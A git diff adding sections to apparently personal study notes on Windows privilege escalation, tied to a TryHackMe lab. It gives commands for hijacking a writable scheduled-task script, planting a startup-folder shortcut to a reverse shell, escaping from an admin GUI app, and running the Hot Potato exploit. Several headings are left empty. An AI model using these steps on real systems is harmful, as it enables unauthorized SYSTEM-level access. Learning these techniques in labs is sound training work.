@@ -145,6 +145,7 @@ https://tryhackme.com/room/enumerationpe
 - [installed apps](#installed-apps)
 - [hot potato](#hot-potato)
 - [token impersonation](#token-impersonation)
+  - [2 Service Accounts](#2-Service-Accounts)
 - [port forwarding](#port-forwarding)
 - [getsystem Named Pipes and Token Duplication](#getsystem-Named-Pipes-and-Token-Duplication)
 - [user privileges](#user-privileges)
@@ -2668,26 +2669,270 @@ spawn a command prompt using the admin user’s hash.
 
 ### scheduled tasks
 
+Windows can be configured to run tasks at specific
+times, periodically (e.g. every 5 mins) or when triggered
+by some event (e.g. a user logon).
+Tasks usually run with the privileges of the user who
+created them, however administrators can configure
+tasks to run as other users, including SYSTEM.
+  
+#### Commands
+Unfortunately, there is no easy method for enumerating custom tasks that belong to
+other users as a low privileged user account.
+List all scheduled tasks your user can see:
+```
+> schtasks /query /fo LIST /v
+```
+In PowerShell:
+```
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
+#### Privilege Escalation example
+In the C:\DevTools directory, there is a PowerShell script called
+“CleanUp.ps1”. View the script:
+```
+> type C:\DevTools\CleanUp.ps1
+```
+This script seems like it is running every minute as the SYSTEM user. We
+can check our privileges on this script using accesschk.exe:
+```
+> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+```
+It appears we have the ability to write to this file.
+
+Backup the script:
+```
+> copy C:\DevTools\CleanUp.ps1 C:\Temp\
+```
+Start a listener on Kali.
+
+Use echo to append a call to our reverse shell executable to the end of the script:
+```
+> echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+Wait for the scheduled task to run (it should run every minute) to complete the
+exploit.
+
 ### insecure GUI apps
+
+On some (older) versions of Windows, users could be granted the
+permission to run certain GUI apps with administrator privileges.
+There are often numerous ways to spawn command prompts from
+within GUI apps, including using native Windows functionality.
+Since the parent process is running with administrator privileges, the
+spawned command prompt will also run with these privileges.
+I call this the “Citrix Method” because it uses many of the same
+techniques used to break out of Citrix environments.
+
+Log into the Windows VM using the GUI with the “user”
+account.
+
+#### Privilege Escalation example:
+Double click on the “AdminPaint” shortcut on the
+Desktop.
+
+Open a command prompt and run:
+```
+> tasklist /V | findstr mspaint.exe
+```
+Note that mspaint.exe is running with admin privileges. (in this example)
+
+In Paint, click File, then Open.
+
+In the navigation input, replace the contents with:
+
+```
+file://c:/windows/system32/cmd.exe
+```
+
+Press Enter. A command prompt should open
+running with admin privileges.
+
 
 ### startup apps
 
+Each user can define apps that start when they log in, by placing
+shortcuts to them in a specific directory.
+Windows also has a startup directory for apps that should start for all
+users:
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+If we can create files in this directory, we can use our reverse shell
+executable and escalate privileges when an admin logs in.
+
+Note that shortcut files (.lnk) must be used. The following VBScript can be used
+to create a shortcut file:
+
+```
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
+Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+```
+
+#### Privilege Escalation example 
+
+Use accesschk.exe to check permissions on the StartUp
+directory:
+```
+> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+```
+Note that the BUILTIN\Users group has write access to
+this directory.
+
+Create a file CreateShortcut.vbs with the VBScript
+provided in a previous slide. Change file paths if
+necessary.
+
+Run the script using cscript:
+```
+> cscript CreateShortcut.vbs
+```
+
+Start a listener on Kali, then log in as the admin user to
+trigger the exploit.
+
 ### installed apps
+
+Most privilege escalations relating to installed
+applications are based on misconfigurations we have
+already covered.
+Still, some privilege escalations results from things like
+buffer overflows, so knowing how to identify installed
+applications and known vulnerabilities is still important.
+
+Manually enumerate all running programs:
+
+```
+> tasklist /v
+```
+
+We can also use Seatbelt to search for nonstandard
+processes:
+```
+> .\seatbelt.exe NonstandardProcesses
+```
+
+winPEAS also has this ability (note the misspelling):
+```
+> .\winPEASany.exe quiet procesinfo
+```
+
+#### Exploit-DB
+
+Once you find an interesting process, try to identify its
+version. You can try running the executable with /? or -h, as
+well as checking config or text files in the Program Files
+directory.
+Use Exploit-DB to search for a corresponding exploit.
+Some exploits contain instructions, while others are code
+that you will need to compile and run.
+
+manually enumerate all running programs using task list:
+```
+tasklist /v
+```
+we can also use seatbelt:
+```
+.\seatbelt.exe Nonstandardprocesses
+```
+we can also use winpeas:
+```
+.\winpeas.exe quiet procesinfo
+```
+obs: yes currently thw word "procesinfo" is spelled wrong but can change later just keep that in mind
 
 ### hot potato
 
+Hot Potato is the name of an attack that uses a spoofing attack
+along with an NTLM relay attack to gain SYSTEM privileges.
+The attack tricks Windows into authenticating as the SYSTEM
+user to a fake HTTP server using NTLM. The NTLM credentials
+then get relayed to SMB in order to gain command execution.
+This attack works on Windows 7, 8, early versions of Windows 10,
+and their server counterparts.
+
+#### Privilege Escalation example
+
+(Note: These steps are for Windows 7)
+1.Copy the potato.exe exploit executable over to Windows.
+2.Start a listener on Kali.
+3.Run the exploit:
+```
+.\potato.exe -ip <the current win m,machine ip> -cmd "C:\<path to our reverse shell exe>" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+```
+4.Wait for a Windows Defender update, or trigger one manually.
+
+
+
+
 ### token impersonation
+
+#### 2 Service Accounts
+We briefly talked about service accounts at the start of the
+course.
+Service accounts can be given special privileges in order for them
+to run their services, and cannot be logged into directly.
+Unfortunately, multiple problems have been found with service
+accounts, making them easier to escalate privileges with.
+
+
+
+
+
+
 
 ### port forwarding
 
+
+
+
+
+
+
+
+
 ### privilege escalation strategy
+
+
+
+
+
+
+
+
 
 ### getsystem Named Pipes and Token Duplication
 
+
+
+
+
+
+
+
+
 ### user privileges
+
+
+
+
+
+
+
+
 
 ### Privilege Escalation Strategy
   
+
+
+
+
+
+
+
   -------------------------------------------------------------------------------------------------------------------
   
 # Privilege Escalation Techniques
